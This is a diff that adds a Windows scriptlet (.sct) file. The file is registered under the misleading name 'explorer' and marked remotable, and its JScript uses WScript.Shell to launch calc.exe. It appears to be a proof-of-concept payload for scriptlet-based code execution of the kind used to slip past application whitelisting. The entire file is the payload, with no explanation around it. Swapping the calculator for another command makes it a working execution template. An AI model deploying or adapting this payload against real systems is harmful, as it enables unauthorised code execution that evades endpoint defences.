@@ -1,0 +1,16 @@
+<?xml version="1.0"?>
+<scriptlet>
+    <registration
+        description="explorer"
+        progid="explorer"
+        version="1.0"
+        classid="{66666666-6666-6666-6666-666666666666}"
+        remotable="true">
+    </registration>
+    <script language="JScript">
+        <![CDATA[
+            var WShell = new ActiveXObject("WScript.Shell");
+            WShell.Run("calc.exe");
+        ]]>
+    </script>
+</scriptlet>
